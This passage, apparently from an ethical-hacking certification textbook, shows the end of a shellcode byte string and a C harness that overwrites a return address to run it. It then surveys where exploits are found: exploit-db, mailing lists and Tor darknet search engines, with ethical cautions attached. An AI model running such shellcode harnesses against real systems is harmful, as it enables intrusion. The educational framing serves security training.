# Shellcode from the exploit-db repository (continued)

```
"\x66\x81\xc3\x4b\x48\xb5" //add bx, 0x854b
"\xFF\xD3" //call ebx
"\xEB\xEA"; //jmp short
```

```
int main(int argc, char **argv) {
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int) shellcode;
}
```

The website exploit-db.com is not the only place to look for exploits, but it is very convenient. It’s also probably the best legitimate site available, and the fact that it comes with a search tool makes it very handy. If you want to learn a lot about exploits and how they are developed, this is a great place to go.

You don’t have to limit yourself to just websites, though. There are mailing lists where announcements of vulnerabilities are made. Sometimes, along with the vulnerability announcement, you will get proof of concept code. How far you can get with the code depends entirely on the researcher, the vulnerability, and the software. Sometimes, what you’ll get is just a demonstration that the vulnerability can be triggered, but you may not get any further access to the remote system than you had before.

There are certainly other places you can go to look for exploits. However, you start skirting the edges of ethics. The so-called dark web, or darknet, is one place you can search for exploits. If you have a Tor browser or just the software that creates a proxy server you can use to connect any browser to, you can start searching for sites where you can obtain some of this code. There are a number of search engines that you can use that are more likely to find some of these darker sites, such as Not Evil. There are considerations to keep in mind, though. One is that sites can come and go on the Tor network. Even if Not Evil turns up links in a search, you aren’t guaranteed to find the site up and functional. In digging around in Tor while writing this, I found that several sites simply didn’t respond.

Second, you don’t know the source of the exploit you find. There are two elements here. One is that you may have been obtained or developed illegally. This crosses the ethical boundaries you are required to adhere to as a Certified Ethical Hacker. Perhaps more important, though, unless you are really good at reading source code, even if the source code is obfuscated, you may find that you are working with infected software that could compromise you and your target in ways you didn’t expect. This is why it’s so important to work with legitimate and professional sites and researchers.

Finally, Tor is meant as a place for anonymity. This includes not only the users who are visiting the sites but also the sites themselves. It will be time-consuming to learn where everything is located. It’s also a place for illicit commerce. You may find some exploits on the Tor network, but more than likely if you do, they will be for sale rather than just offered up for the good of the community.